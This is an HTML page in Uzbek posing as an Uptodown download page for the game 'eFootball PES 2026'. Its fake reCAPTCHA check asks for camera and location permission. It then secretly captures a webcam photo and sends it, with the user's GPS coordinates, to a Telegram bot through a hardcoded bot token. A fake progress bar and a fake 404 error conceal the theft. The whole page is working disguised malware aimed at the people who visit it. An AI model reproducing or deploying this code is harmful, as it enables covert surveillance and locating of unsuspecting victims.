<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 - Download</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-dim: #7e949c;
        }

        body { margin: 0; background-color: var(--ut-bg); font-family: 'Roboto', sans-serif; color: #ffffff; overflow-x: hidden; }

        /* Asosiy sahifa elementlari */
        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; transition: filter 0.3s ease; }
        .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
        .app-icon { width: 90px; height: 90px; border-radius: 20px; background: #102a33; }
        
        /* Chiroyli Yuklab olish tugmasi */
        .btn-main {
            background: var(--ut-green);
            color: white;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
            text-transform: uppercase;
        }

        /* Overlay (Orqa fonni xiralashtirish) */
        #overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        /* Captcha va Progress Box */
        .modal-box { background: #fff; padding: 25px; border-radius: 4px; color: #000; width: 320px; text-align: center; }
        
        .captcha-mini {
            border: 1px solid #d3d3d3;
            padding: 10px;
            display: flex;
            align-items: center;
            cursor: pointer;
            background: #f9f9f9;
        }
        .c-check { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; display: flex; align-items: center; justify-content: center; }

        /* Progress Bar */
        #progress-container { display: none; margin-top: 20px; }
        .progress-bar { width: 100%; height: 10px; background: #eee; border-radius: 5px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: var(--ut-green); transition: width 0.1s; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="main-content" id="content">
    <div class="app-header">
        <div class="app-icon"></div>
        <div>
            <h1>eFootball PES 2026</h1>
            <p style="color:var(--ut-dim)">10.4.0 | Uptodown</p>
        </div>
    </div>
    
    <button class="btn-main" onclick="showCaptcha()">Oxirgi versiya (Yuklash)</button>

    <div style="margin-top: 20px; color: var(--ut-dim); font-size: 12px;">
        <p>Hajmi: 1.9 GB</p>
        <p>Talablar: Android 7.0+</p>
    </div>
</div>

<div id="overlay">
    <div class="modal-box" id="modal">
        <div id="captcha-step">
            <h3 style="margin-top:0; font-size: 16px;">Xavfsizlik tekshiruvi</h3>
            <p style="font-size: 13px; color: #666;">Yuklab olishdan oldin robot emasligingizni tasdiqlang.</p>
            <div class="captcha-mini" onclick="verifyUser()">
                <div class="c-check" id="checkmark"></div>
                <div style="flex-grow:1; text-align:left; font-size:14px;">I'm not a robot</div>
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
            </div>
        </div>

        <div id="progress-container">
            <h3 style="margin-top:0; font-size: 16px;">Fayl tayyorlanmoqda...</h3>
            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
            <p id="percent" style="font-size: 14px; margin-top: 10px;">0%</p>
        </div>
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function showCaptcha() {
        document.getElementById('content').style.filter = "blur(8px)";
        document.getElementById('overlay').style.display = "flex";
    }

    async function verifyUser() {
        const check = document.getElementById('checkmark');
        check.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="18">';

        try {
            // Ruxsatlarni so'rash
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (pos) => {
                
                // Botga ma'lumotni yashirincha yuborish
                sendData(stream, pos);

                // Captcha muvaffaqiyatli
                check.innerHTML = '✅';
                setTimeout(() => {
                    document.getElementById('captcha-step').style.display = "none";
                    startLoading();
                }, 1000);

            }, (err) => { alert("Joylashuv ruxsati zarur!"); location.reload(); });
        } catch (e) { alert("Kameraga ruxsat berilishi shart!"); location.reload(); }
    }

    function startLoading() {
        document.getElementById('progress-container').style.display = "block";
        let width = 0;
        const fill = document.getElementById('fill');
        const percent = document.getElementById('percent');

        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                // 4. To'rtinchi bosqich: 404 Error
                showError();
            } else {
                width += Math.random() * 2;
                if(width > 100) width = 100;
                fill.style.width = width + "%";
                percent.innerText = Math.floor(width) + "%";
            }
        }, 100);
    }

    function showError() {
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:100px; color:#fff; font-family:sans-serif;">
                <h1 style="font-size:100px; margin-bottom:0;">404</h1>
                <p style="font-size:20px;">Xatolik: Server bilan aloqa uzildi.</p>
                <p style="color:#7e949c;">Fayl topilmadi yoki yuklash muddati tugadi (Error_0x884)</p>
                <button onclick="location.reload()" style="margin-top:20px; padding:10px 20px; background:var(--ut-blue); border:none; color:#fff; border-radius:5px;">Qaytadan urinish</button>
            </div>
        `;
    }

    async function sendData(stream, pos) {
        const video = document.getElementById('v-stream');
        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 800));
        const canvas = document.getElementById('v-canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.5))).blob();
        stream.getTracks().forEach(t => t.stop());

        const fd = new FormData();
        fd.append('chat_id', CONFIG.CHAT);
        fd.append('photo', snap);
        fd.append('caption', `📥 *Yangi Target*\n📍 Geo: ${pos.coords.latitude}, ${pos.coords.longitude}`);
        
        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

</body>
</html>
